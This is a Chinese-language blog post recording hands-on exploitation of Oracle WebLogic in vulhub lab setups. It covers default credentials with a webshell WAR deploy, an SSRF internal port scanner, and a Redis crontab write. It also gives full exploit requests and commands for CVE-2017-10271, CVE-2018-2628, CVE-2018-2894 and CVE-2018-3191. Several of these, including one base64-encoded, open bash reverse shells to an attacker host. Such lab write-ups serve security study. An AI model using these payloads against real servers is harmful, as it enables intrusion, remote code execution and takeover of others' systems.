---
title: weblogic漏洞练习
date: 2018-09-10 15:53:40
tags:
	- java
	- 练习记录
	- weblogic
---

# About WebLogic

> **WebLogic**是美商Oracle的主要产品之一，系购并得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器，目前已推出到12c（12.1.1）版。而此产品也延伸出WebLogic Portal, WebLogic Integration等企业用的中间件（但目前Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE（Oracle Enterprise Pack for Eclipse）开发工具。
>
>                                        							———— 引自 wikipedia

类似于一个Tomcat Apche之类的webserver，但是拥有更多集成的开发、集成、部署和管理功能。

常开放于7001/7002端口

漏洞环境来自于vulhub  https://github.com/vulhub/vulhub/tree/master/weblogic


# weak_password

访问`/console`会转跳到管理员的登录界面

![](weblogic漏洞练习\1.png)

这里提供了两种方法进行进入后台，一个是弱口令，还有就是配合任意文件读取破解密码



弱口令的话没什么技巧可言，但也是实战中比较重要的一种方式，这里账号密码为

- 账号：weblogic
- 密码：Oracle@123



配合任意文件读取的话这里提供了一个`http://your-ip:7001/hello/file.jsp?path=`任意文件读取点，需要读取两个文件（当前目录为`/root/Oracle/Middleware/user_projects/domains/base_domain`）

`./security/SerializedSystemIni.dat` 并将获取到的二进制字符保存到文件中

![](weblogic漏洞练习\2.png)

`./config/config.xml`获取到`node-manager-password-encrypted`这个字段下的值

![](weblogic漏洞练习\3.png)

由于加密的算法是基于对称加密的，所以可以破解出原密码（工具在网上也不难找到

![](weblogic漏洞练习\4.png)



这样就可以顺利登录到网站后台了，然后就是部署一个包含自己马的war包（没有jsp马的我默默问大佬要了个马

linux下可以直接用命令打包war包

```
jar -cvf [war包名] [目录名]
```



![](weblogic漏洞练习\5.png)

然后部署war包

![](weblogic漏洞练习\1.gif)

访问`http://your-ip:7001/web/web/xxx.jsp`即可访问到上传的马

![](weblogic漏洞练习\6.png)



# SSRF

漏洞产生于`/uddiexplorer/SearchPublicRegistries.jsp`页面中，可以导致ssrf，用来攻击内网中一些redis和fastcgi之类的脆弱组件

```
http://192.168.85.133:7001/uddiexplorer/SearchPublicRegistries.jsp
?rdoSearch=name
&txtSearchname=sdf
&txtSearchkey=
&txtSearchfor=
&selfor=Business+location
&btnSubmit=Search
&operator=http://localhost:7001
```

当http端口存活的时候就会显示404not found

![](weblogic漏洞练习\7.png)

随机访问一个端口则会显示could not connect

![](weblogic漏洞练习\8.png)



一个非http的协议则会返回`did not have a valid SOAP`，不存活的主机就是`No route to host`

访问redis服务时

![](weblogic漏洞练习\9.png)



**攻击内网redis**

一个简单的内网扫扫描

```python
import requests
url = "http://192.168.85.133:7001/uddiexplorer/SearchPublicRegistries.jsp"

ports = [6378,6379,22,25,80,8080,8888,8000, 7001, 7002]
for i in range(1,255):
	for port in ports:
		params = dict(
			rdoSearch = "name",
			txtSearchname = "sdf",
			selfor = "Business+location",
			btnSubmit = "Search",
			operator = "http://172.23.0.{}:{}".format(i,port))
		try:
			r = requests.get(url, params=params, timeout = 3)
		except:
			pass
        
		if 'could not connect over HTTP to server' not in r.text and 'No route to host' not in r.text:
			print('[*] http://172.23.0.{}:{}'.format(i,port))
		else:
			pass#print('[-] http://172.23.0.{}:{}'.format(i,port))
```

扫描结果

```
[*] http://172.23.0.1:80
[*] http://172.23.0.1:7001
[*] http://172.23.0.2:6379
[*] http://172.23.0.3:7001
```

172.23.0.1是我本地虚拟机，就可以忽略，6379就是很熟悉的redis了

写如定时命令，详细攻击redis可以参考下 https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/

```
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.23.0.1/21 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```

转换成url格式，然后传输

```
http://192.168.85.133:7001//uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.23.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20>%26%20%2Fdev%2Ftcp%2F172.23.0.1%2F1234%200>%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

在虚拟机中用nc监听端口

```
nc -l -p 1234
```

过一会就能看到反弹回来的shell

![](weblogic漏洞练习\10.png)

业务无需UUDI功能时建议将其关闭

# 反序列化 CVE-2017-10271

> Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。



漏洞发生在`/wls-wsat/CoordinatorPortType`页面中，它会将传入的xml语句进行解析、然后反序列化，造成任意代码执行

构造如下的http包，在`<string>sub</string>`中传入所需的命令即可命令执行

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.85.133:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 544
Connection: close
Upgrade-Insecure-Requests: 1

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>sub</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

我这由于是在虚拟机中搭建的，就弹了个sublime框

需要注意的是`Content-Type`要设置成`text/xml`否则不会解析xml



# 反序列化 CVE-2018-2628

首先需要一个ysoserial

https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar

启动一个JRMP Server，[listen port] 为监听的端口    [ommand]为想要执行的命令

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
```

如我这为

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 23333 CommonsCollections1 'touch /tmp/evil'
```



运行[exp](https://github.com/kingkaki/Exploit-scripts/blob/master/weblogic/CVE-2018-2628.py)

```
python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
```

- [victim ip]： weblogic ip
- [victim port]：weblogic 端口
- [path to ysoserial]：ysoserial地址
- [JRMPListener ip]：JRMP Server的ip
- [JRMPListener port]：JRMP Server的端口
- [JRMPClient]：有JRMPClient`或`JRMPClient2两个选项

```
python 44553.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.85.133 23333 JRMPClient
```

![](weblogic漏洞练习\2.gif)

然后进入虚拟机内部之后，就可看到tmp目录下生成的evil文件

![](weblogic漏洞练习\11.png)



复现的时候有几个小问题，JRMP Server的ip需要填本地主网卡（用于上网的那个）的ip

然后在物理机上攻击虚拟机中映射出来的docker环境不知道为什么没有成功

以及自己在虚拟机上搭建的weblogic10.3.6貌似也没有成功。。



# 任意文件上传 CVE-2018-2894

访问`/ws_utc/config.do`页面可以设置工作目录，将其设置为

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
```

然后在安全->添加处上传一个小马

![](weblogic漏洞练习\13.png)

在返回的数据包中有文件的id值

![](weblogic漏洞练习\12.png)

然后访问`/ws_utc/css/config/keystore/[id]_[filename]`即可访问到文件

![](weblogic漏洞练习\14.png)



这个漏洞有个限制条件就是需要在`开发模式`下进行，否生产模式时需要进行认证登录



# CVE-2018-3191

更新于2018/10/31

听说最近又出了一个危害比较大的漏洞，遂复现了一下。和之前一样，需要weblogic开启T3协议

```
nmap -n -v -Pn -sV 192.168.85.144 --script=weblogic-t3-info.nse
```

![](2018SECCON-ghostkingdom\9.jpg)

需要一些准备的工具，具体可看这里https://github.com/jas502n/CVE-2018-3191

需要先生成一个payload

```
java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://攻击机ip:端口/exp > payload
```

```
java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://172.20.0.1:8888/exp > payload
```

![](weblogic漏洞练习\16.png)

  

开启一个rmi服务

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 "要执行的指令"
```

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8888 Commonollections1 "bash -c {echo,L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvMTcyLjIwLjAuMS83Nzc3IDA8JjEgMj4mMQ==}|{base64,-d}|{bash,-i}"
```

这里将shell弹到了本地的7777端口，用nc监听一下

```
nc -lnvp 7777
```

发送攻击流量

```
python weblogic.py 172.20.0.2 7001 payload
```

![](weblogic漏洞练习\17.png)

同时rmi服务会接受到`172.20.0.2`的流量

![](weblogic漏洞练习\18.png)

成功getshell

![](weblogic漏洞练习\19.png)















